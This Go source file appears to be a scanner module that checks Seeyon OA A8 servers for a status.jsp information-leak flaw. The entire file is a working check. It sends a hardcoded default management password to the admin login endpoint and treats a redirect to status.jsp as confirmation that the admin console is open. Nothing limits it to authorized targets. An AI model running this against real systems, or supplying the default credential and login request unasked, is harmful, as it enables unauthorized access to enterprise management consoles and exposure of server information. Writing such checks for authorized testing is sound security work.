package A8_status_information_leakage

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/seeyon/management/index.jsp"
	password := "WLCCYBD@SEEYON"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":      UA,
			"Accept-Encoding": "gzip, deflate",
			"Referer":         url + "/seeyon/management/index.jsp",
		}).
		SetBody("password=" + password).
		Post(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	致远OA A8 status.jsp 信息泄露漏洞不存在")
		return
	}

	if resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "/seeyon/management/status.jsp") {
		color.Green.Println("[+] 致远OA A8 status.jsp 信息泄露漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-]	致远OA A8 status.jsp 信息泄露漏洞不存在")
	}
}
